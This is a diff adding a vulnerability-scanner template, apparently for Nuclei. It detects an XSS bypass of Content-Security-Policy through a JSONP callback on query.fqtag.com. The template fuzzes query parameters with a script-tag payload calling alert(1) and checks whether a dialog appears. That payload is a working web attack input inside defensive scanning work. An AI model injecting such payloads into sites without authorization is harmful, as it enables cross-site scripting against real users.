@@ -1,0 +1,55 @@
+id: fqtag-query-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - FQTag Query
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,fqtag-query
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "fqtag.com"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: fqtag_query_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://query.fqtag.com/b?callback=alert(1)"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "fqtag_query_csp_xss == true"
+# digest: 4a0a0047304502205bfbfa3f6f228dc56faadb5bb370360a06d23a063400d4703a426d46a80b0716022100e368674149e964fabc431a389bb2ef3a087f08e23e9c2966dec4b97c956f2c89:922c64590222798bb761d5b6d8e72950
